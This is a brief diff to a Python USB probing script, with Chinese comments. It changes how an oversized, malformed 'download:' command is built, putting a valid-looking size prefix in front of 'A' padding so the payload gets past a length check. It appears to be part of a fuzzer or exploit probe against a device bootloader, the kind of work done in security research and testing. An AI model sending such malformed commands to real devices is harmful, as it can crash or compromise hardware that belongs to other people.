@@ -133,8 +133,13 @@ def probe_via_usb(lengths, verbose=False):
     for length in lengths:
         # ── 构造畸形 download 命令 ──
         # 正常格式: "download:XXXXXXXX" (8位16进制)
-        # 畸形格式: "download:" + "41" * N  (超长16进制字符串)
-        hex_payload = "41" * length  # 全用 'A' 填充
+        # 我们需要绕过大小检查: 前缀必须是一个合法的较小数值
+        # `00001000` = 4096 字节。
+        if length <= 8:
+            hex_payload = "00001000"[:length] 
+        else:
+            hex_payload = "00001000" + "A" * (length - 8)
+            
         raw_cmd = f"download:{hex_payload}"
 
         print(f"\n[*] 长度 {length:>4d} 字符 | 命令总长 {len(raw_cmd):>4d} 字节", end="", flush=True)
